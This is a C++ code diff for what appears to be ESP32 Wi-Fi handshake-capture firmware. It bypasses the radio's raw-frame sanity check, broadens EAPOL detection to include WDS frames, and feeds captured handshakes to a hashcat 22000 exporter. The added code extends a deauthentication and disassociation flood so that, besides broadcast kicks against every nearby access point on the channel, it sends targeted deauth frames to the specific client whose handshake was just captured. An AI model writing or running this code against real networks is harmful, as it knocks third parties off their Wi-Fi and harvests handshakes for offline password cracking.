@@ -21,8 +21,8 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
 
 namespace Cap {
 
-static const uint16_t FRAME_MAX = 320;
-static const uint8_t  RING_SLOTS = 8;
+static const uint16_t FRAME_MAX = 400;
+static const uint8_t  RING_SLOTS = 12;
 static const uint32_t MAX_FILE_SIZE = 50 * 1024;
 static const uint16_t MAX_FILES = 200;
 static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
@@ -70,6 +70,9 @@ static uint8_t  s_channelIdx = 0;
 static uint32_t s_lastHopMs = 0;
 static uint8_t  s_apMac[6] = {};
 static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint8_t  s_kickSta[6] = {};
+static uint8_t  s_kickBssid[6] = {};
+static bool     s_kickStaOk = false;
 static uint32_t s_lockUntil = 0;
 static bool     s_lockOnHs = true;
 static uint16_t s_lockMs = 8000;
@@ -196,22 +199,29 @@ static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t typ
     } else if (!toDs && fromDs) {
         bssid   = f + 10;
         station = f + 4;
+    } else if (toDs && fromDs) {
+        // WDS / 4-address — Porkchop still looks for EAPOL here.
+        bssid   = f + 16;
+        station = f + 10;
+        bodyOff = 30;
     } else {
-        return;
+        bssid   = f + 16;
+        station = f + 10;
     }
 
-    bool isQosData = (f[0] & 0x80) != 0;
-    if (isQosData) bodyOff += 2;
-    if ((f[1] & 0x80) != 0) bodyOff += 4;
+    uint8_t subtype = (f[0] >> 4) & 0x0F;
+    bool isQos = (subtype & 0x08) != 0;
+    if (isQos) bodyOff += 2;
+    if (isQos && (f[1] & 0x80)) bodyOff += 4;
 
     bool eapol = false;
-    if (bodyOff + 8 <= len && f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA &&
-        f[bodyOff + 2] == 0x03) {
-        uint16_t ethertype = ((uint16_t)f[bodyOff + 6] << 8) | f[bodyOff + 7];
-        if (ethertype == 0x888E) eapol = true;
+    if (bodyOff + 8 <= len &&
+        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
+        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
+        eapol = true;
     }
     if (!eapol) {
-        uint16_t lim = (len < bodyOff + 24) ? len : (uint16_t)(bodyOff + 24);
+        uint16_t lim = len;
         for (uint16_t i = bodyOff; i + 1 < lim; i++) {
             if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
         }
@@ -352,6 +362,9 @@ static void writeFrameToFile(const Slot& s) {
     }
     s_cnt.framesWritten++;
     Hc22000::feed(s.frame, s.len);
+    memcpy(s_kickBssid, s.bssid, 6);
+    memcpy(s_kickSta, s.station, 6);
+    s_kickStaOk = (s.station[0] & 0x01) == 0;
     char ssid[33];
     ssidForBssid(s.bssid, ssid);
     memcpy(s_lastHsBssid, s.bssid, 6);
@@ -376,7 +389,7 @@ static bool isOwnAp(const uint8_t* bssid) {
     return memcmp(bssid, s_apMac, 6) == 0;
 }
 
-static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
+static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
     uint8_t pkt[26] = {
         fc0, 0x00,
         0x00, 0x00,
@@ -386,7 +399,7 @@ static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid) {
         0x00, 0x00,
         0x07, 0x00
     };
-    memcpy(pkt + 4, s_bcast, 6);
+    memcpy(pkt + 4, dest, 6);
     memcpy(pkt + 10, bssid, 6);
     memcpy(pkt + 16, bssid, 6);
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
@@ -399,11 +412,16 @@ static void kickOnThisChannel() {
     if (Hc22000::shouldPauseDeauth()) return;
     uint8_t ch = s_cnt.currentChannel;
     for (uint8_t i = 0; i < s_beaconCount; i++) {
+        const uint8_t* bssid = s_beacons[i].bssid;
         if (s_beacons[i].channel != ch) continue;
-        if (isOwnAp(s_beacons[i].bssid)) continue;
+        if (isOwnAp(bssid)) continue;
         if (s_beacons[i].rssi < s_minRssi) continue;
-        sendRawMgmt(0xC0, s_beacons[i].bssid); // deauth
-        sendRawMgmt(0xA0, s_beacons[i].bssid); // disassoc
+        sendRawMgmt(0xC0, bssid, s_bcast);
+        sendRawMgmt(0xA0, bssid, s_bcast);
+        if (s_kickStaOk && memcmp(s_kickBssid, bssid, 6) == 0) {
+            sendRawMgmt(0xC0, bssid, s_kickSta);
+            sendRawMgmt(0xA0, bssid, s_kickSta);
+        }
         yield();
     }
 }
@@ -438,6 +456,7 @@ static void startCommon(RunMode mode) {
     s_lastHopMs = millis();
     s_channelIdx = 0;
     s_lockUntil = 0;
+    s_kickStaOk = false;
     s_mode = mode;
     s_hopEnabled = (mode == RunMode::Aggressive);
     s_deauthEnabled = (mode == RunMode::Aggressive) && Config::radio().deauth;
